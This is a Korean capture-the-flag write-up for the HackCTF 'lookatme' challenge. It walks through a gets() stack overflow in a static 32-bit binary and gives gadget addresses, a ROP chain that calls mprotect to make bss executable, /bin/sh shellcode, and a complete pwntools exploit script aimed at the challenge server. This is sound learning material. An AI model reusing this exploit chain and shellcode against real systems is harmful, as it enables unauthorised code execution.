@@ -1,0 +1,268 @@
+풀이
+
+보호기법을 확인했을떄 nx 가 걸려있으므로 쉘코드는 사용하지 못한다. 또한
+
+RELRO 안걸려있어서 go overwrite 가능하다.
+
+
+main.c  를 확인해보자.
+
+int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  int v3; // edx
+  int v4; // ecx
+  int v5; // ST1C_4
+
+  setvbuf(stdout, 0, 2, 0);
+  v5 = getegid(v4, v3);
+  setresgid(v5, v5, v5);
+  look_at_me();
+  return 0;
+}
+
+코드가 외외로 간단하다.  look_at_me() 함수도 살펴보면
+
+int look_at_me()
+{
+  char v1; // [esp+0h] [ebp-18h]
+
+  puts("Hellooooooooooooooooooooo");
+  return gets(&v1);
+}
+
+인데 gets() 함수가 취약점이므로 공격해야한다는것은 쉽게 알수있다.
+
+하지만 어떠한방법으로 공격해야할지 감이 서지않았는데.
+
+이유는 system함수도 없고 execute 함수도 없어서 내가배운지식으로는
+풀기 힘들었다. 그래서 검색해서 알아본 결과 mprotect 함수를 이용해서 
+
+실행권한을 부여할수있다는 사실을 보았고 한번 시도해 보았다.
+
+@@@@@@@@@@@@@@@@@@@@@@@@@
+
+mprotect 를 사용하려면
+
+이 mprotect 함수는
+
+3개의 인자가 필요하다. 바로 권한을 줄 시작위치, 길이, 권한이다.
+
+출처: https://xn--vj5b11biyw.kr/194 [Ho_use]
+
+@@@@@@@@@@@@@@@@@@@@@@@@@
+
+mprotect 함수를 사용하면 NX로 인해 쉘코드를 사용할수없어도 쉘코드 실행가능하다.
+
+고정된 주소값에 쉘코드를 삽입하기위해 bss영역을 사용한다.
+
+그리고 권한을 얻기위해서 여러 정보를 얻어야한다.
+
+(objdump -d lookatme | egrep 'pop|ret')
+
+
+80bafb9:	5b                   	pop    %ebx
+ 80bafba:	5e                   	pop    %esi
+ 80bafbb:	5f                   	pop    %edi
+ 80bafbc:	c3                   	ret    
+ 80bb008:	c3                   	ret    
+ 80bb061:	5b                   	pop    %ebx
+ 80bb062:	5e                   	pop    %esi
+ 80bb063:	f3 c3                	repz ret 
+ 80bb0b8:	5b                   	pop    %ebx
+ 80bb0b9:	c3                   	ret    
+ 80bb11c:	5b                   	pop    %ebx
+ 80bb11d:	5e                   	pop    %esi
+ 80bb11e:	c3                   	ret    
+ 80bb125:	5b                   	pop    %ebx
+ 80bb126:	5e                   	pop    %esi
+ 80bb127:	c3                   	ret    
+ 80bb135:	c3                   	ret    
+ 80bb211:	5b                   	pop    %ebx
+ 80bb212:	5e                   	pop    %esi
+ 80bb213:	c3                   	ret    
+ 80bb2e0:	f3 c3                	repz ret 
+ 80bb312:	5b                   	pop    %ebx
+ 80bb313:	c3                   	ret    
+
+
+이부분에서
+
+PPPR gadget address >> 80bacfe:	5b                   	pop    %ebx
+						pop    %esi
+						pop    %edi
+						ret
+
+
+PR gadget address >> 80bb0b8:	5b                   	pop    %ebx
+						ret
+
+따라서
+
+PPPR gadget address : 80bacfe
+PR gadget address : 80bb0b8
+
+
+
+1. bss 주소
+(readelf -S lookatme)
+2. gadget 주소
+
+
+
+1.bss 주소
+
+bss address : 080eaf80
+
+
+2. gadget 주소
+
+PPPR gadget address : 80bacfe
+PR gadget address : 80bb0b8
+
+
+get 주소 
+
+0x804f120
+
+mprotect 주소
+
+0x806e0f0
+
+
+이제 우리가 넣을 ret 주소를 찾아보면
+
+0x08048895 <+25>:	lea    eax,[ebp-0x18]
+
+
+이므로
+
+0x18을 십진수로 바꾸면 24이다. 
+
+이 프로그램이 32비트 프로그램이기 떄문에 STP 4바이트를 더하면
+
+24 + 4 = 28 이다.
+
+따라서 페이로드 구성은
+
+버퍼(28) + ret 주소 이므로
+
+28byte + get주소 + pr 주소 + bss 주소 + [ mprotect 주소 + pppr 주소 bss 시작 주소 + 0x1000 + 권한(7) + bss 주소
+
+해주면 된다.
+
+
+
+@@@@@
+해당 문제를 풀기위해 우리가 구해야할 주소는
+
+mprotect 주소와 gets 주소
+
+( e = ELF('./lookatme') ) 형식으로 구해도 된다.
+
+나머지 PR 주소와 PPPR 주소  bss 주소와 bss 초기주소( 뒷부분 4자리 0000으로 초기화 ) 
+
+bss에 실행권한을 주어야하므로 길이를 맞추어줘야하는데 bss 사이즈가 0x000E0C 이다 
+
+이것을 10진수로 바꾸어주면 3596인데 넉넉하게 0x1000 으로 잡자. (십진수 4096)
+@@@@@
+
+
+
+총 정리
+
+
+28byte + get주소(ret주소위치) + pr 주소 + bss 주소 + [ mprotect 주소 + pppr 주소 bss 시작 주소 + 0x1000 + 권한(7) + bss 주소
+
+
+쉘코드 
+
+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"
+
+
+#@get 주소
+e = ELF('./lookatme')
+
+e.symbol['gets']
+
+#@pr 주소
+
+0x80bb0b8
+
+#@bss 주소
+
+0x080eaf80
+
+
+#@mprotect 주소
+
+e.symbol['mprotcet']
+
+#pppr 주소
+
+0x80bacfe
+
+
+#@bss 시작 주소
+
+0x080ea000
+
+
+이제 페이로드 작성 ㄱㄱ
+
+( 과정)
+
+##
+sendline(payload)
+sendline(shellcode)
+##
+
+
+
+페이로드
+
+look.py
+
+from pwn import *
+
+p=remote("ctf.j0n9hyun.xyz",3017)
+e = ELF('./lookatme')
+
+shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"
+
+get_address = e.symbols['gets']
+mpro_address = e.symbols['mprotect']
+
+pr_address = 0x80bb0b8
+pppr_address = 0x80bacfe
+
+bss_address = 0x080eaf80
+bss_start_address = 0x080ea000
+
+
+payload = 'A' * 28
+payload += p32(get_address)
+payload += p32(pr_address)
+payload += p32(bss_address)
+
+payload += p32(mpro_address)
+payload += p32(pppr_address)
+payload += p32(bss_start_address)
+payload += p32(0x1000)
+payload += p32(7)
+payload += p32(bss_address)
+
+p.recvuntil('Hellooooooooooooooooooooo')
+
+p.sendline(payload)
+p.sendline(shellcode)
+
+p.interactive()
+
+
+
+
+
+
+flag
+
+HackCTF{Did_you_understand_the_static_linking_method?}
